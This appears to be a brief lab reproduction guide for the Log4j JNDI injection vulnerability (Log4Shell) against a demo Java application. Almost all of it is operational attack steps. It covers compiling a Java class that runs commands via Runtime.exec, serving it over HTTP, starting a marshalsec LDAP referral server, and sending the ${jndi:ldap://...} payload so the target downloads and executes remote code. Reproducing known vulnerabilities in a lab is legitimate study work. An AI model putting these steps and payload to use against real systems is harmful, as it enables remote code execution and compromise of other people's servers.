Reproduction environment preparation: 
1) Prepare demo.jar or idea code debugging environment; 
2) JDK version needs to be below 11, recommend 1.8.0_181; 
3) Affected versions: `Log4j 2.x <= 2.15.0-rc1`. Use JD-GUI to decompile demo.jar, analyze code to find /hello route receives payload parameter and uses logger.error to record.

Payload construction process: 
1) Write malicious Java class `dnslog.java`, use `Runtime.exec` to execute commands; 
2) Compile to generate `dnslog.class`; 
3) Start HTTP service to provide malicious class download: `python3 -m http.server 80`; 
4) Start LDAP service: `java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://192.168.3.64/#dnslog`; 
5) Send payload: `${jndi:ldap://192.168.3.64:1389/dnslog}`.
